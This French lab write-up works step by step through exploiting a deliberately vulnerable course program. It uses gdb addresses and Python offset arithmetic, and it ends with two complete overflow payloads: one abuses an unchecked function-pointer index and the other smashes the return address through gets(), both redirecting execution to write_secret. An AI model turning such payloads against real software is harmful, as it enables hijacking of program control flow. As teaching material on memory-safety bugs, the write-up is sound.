# TP sur le Buffer Overflow

Pour référence :

```c
fptr  ptrs[3] = { NULL, get_wisdom, put_wisdom };

int main(int argc, char *argv[]) {

  while(1) {
      char  buf[1024] = {0};
      int r;
      fptr p = pat_on_back;
      r = write(outfd, greeting, sizeof(greeting)-sizeof(char));
      if(r < 0) {
        break;
      }
      r = read(infd, buf, sizeof(buf)-sizeof(char));
      if(r > 0) {
        buf[r] = '\0';
        int s = atoi(buf);
        fptr tmp = ptrs[s];
        tmp();
      } else {
        break;
      }
  }

  return 0;
}
```

## Question 1

La 1re variable que je trouve étant sujette à une attaque buffer overflow est `wis` dans la fonction `put_wisdom`.

## Question 2

Cette variable est remplie par la fonction dépréciée `gets`, qui écrit dans la mémoire sans vérifier la taille du buffer, jusqu'à rencontrer un `\n`, EOF ou `\0`.

```c
void put_wisdom(void) {
  char  wis[DATA_SIZE] = {0}; 
  int   r;

  r = write(outfd, prompt, sizeof(prompt)-sizeof(char));
  if(r < 0) {
    return;
  }
 
  r = (int)gets(wis); 
  if (r == 0)
    return;
  ...
}
```

## Question 3

Une autre variable est sujette à une attaque buffer overflow et qui ne se trouve pas dans la *stack* est le tableau `ptrs` qui est une variable global.

```c
fptr  ptrs[3] = { NULL, get_wisdom, put_wisdom };
```

## Question 4

```
fptr tmp = ptrs[s]; // on peut overflow
tmp();
```

Si on calcul le bon offset `s`, on peut aller exécuter une autre fonction que `put_wisdom` ou `get_wisdom`.
Par exemple, on peut mettre l'adresse de `write_secret` dans `buf` et calculer l'offset pour que `s` pointe sur cette adresse, ce qui va exécuter `write_secret` quand on arrive à `tmp()`.

## Question 5

```
(gdb) print &buf
$2 = (char (*)[1024]) 0xbffff400
```

## Question 6

```
(gdb) print &ptrs
$3 = (fptr (*)[3]) 0x804a0d4
```

## Question 7

```
(gdb) print &write_secret
$4 = (void (*)(void)) 0x8048534 <write_secret>
```

## Question 8

```
(gdb) print &p
$6 = (fptr *) 0xbffff804
```

## Question 9

En python : 

```
>>> ptrs = 0x804a0d4
>>> p = 0xbffff804
>>> (p-ptrs)//4
771675596
```

On divise par 4 car avec `ptrs[1]` on se déplace de 1 adresse, et 1 adresse = 4 octets sur un système 32 bits.
Ainsi, si on veut se déplacé de X octets, on peut en faite faire `ptrs[X//4]`.

Note : `//` est l'opérateur de division entière en python.

## Question 10

```
>>> ptrs = 0x804a0d4
>>> buf = 0xbffff400
>>> (buf-ptrs + 64)//4
771675355
```

## Question 11

```
>>> ptrs = 0x804a0d4
>>> write_secret = 0x8048534
```

Donc on écrit en input :
```
771675355\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x85\x04\x8
~~~~~~~~~ ~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~
adresse   fin  On remplit buf pour atteindre buf[64]                adresse de 
                                                                    write_secret 
                                                                    en 
                                                                    little-endian 
                                                                    (\x8 ou \x08)
```

## Question 12

```
(gdb) break wisdom-alt.c:62
(gdb) cont
Continuing.

Breakpoint 1, put_wisdom () at wisdom-alt.c:62
62        r = (int)gets(wis);
(gdb) x/48wx $esp
0xbffff320:     0x00000001      0x0804a098      0x00000012      0x00000020
0xbffff330:     0x00000004      0x00000004      0x00000020      0x00000000
0xbffff340:     0xbffff348      0xb7e9e411      0x00000000      0x00000000
0xbffff350:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff360:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff370:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff380:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff390:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff3a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff3b0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff3c0:     0x00000000      0x00000000      0x00000012      0xbffff400
0xbffff3d0:     0x00000000      0xbffff800      0xbffff818      0x0804880d
(gdb) print &write_secret
$1 = (void (*)(void)) 0x8048534 <write_secret>
(gdb) print &wis
$2 = (char (*)[128]) 0xbffff348
(gdb) backtrace
#0  put_wisdom () at wisdom-alt.c:62
#1  0x0804880d in main () at wisdom-alt.c:102
```

```
>>> r = r"""0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000012      0xbffff400 0x00000000      0xbffff800      0xbffff818""" # entre 0xbffff348 (&wis) et 0x0804880d (& de retour, pointe dans main)
>>> len(r.split()) * 4
148
>>> print(r"A\x00" + "A"*(148-2) + r"\x34\x85\x04\x08") # 2 octets pour que gets() puisse lire, padding, et &write_secret little-endian
A\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x85\x04\x08
```